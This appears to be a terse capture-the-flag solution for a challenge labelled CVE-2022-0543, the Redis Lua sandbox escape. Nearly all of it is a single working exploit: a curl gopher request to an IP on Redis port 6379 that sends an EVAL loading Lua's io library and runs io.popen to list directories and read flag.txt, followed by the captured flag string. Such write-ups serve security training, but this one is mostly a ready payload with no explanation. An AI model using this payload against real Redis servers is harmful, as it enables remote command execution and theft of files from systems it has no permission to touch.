CVE-2022-0543

Command: `curl 'gopher://172.105.121.246:6379/_%0D%0Aeval%20'"'"'local%20io_l%20=%20package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0",%20"luaopen_io");%20local%20io%20=%20io_l();%20local%20f%20=%20io.popen("cd%20..;cd%20..;cd%20..;ls;cat%20flag.txt",%20"r");%20local%20res%20=%20f:read("*a");%20f:close();%20return%20res'"'"'%200%0D%0Aquit%0D%0A'`

Flag: `KCTF{c0n6r475_b015_n1c3_c47ch}`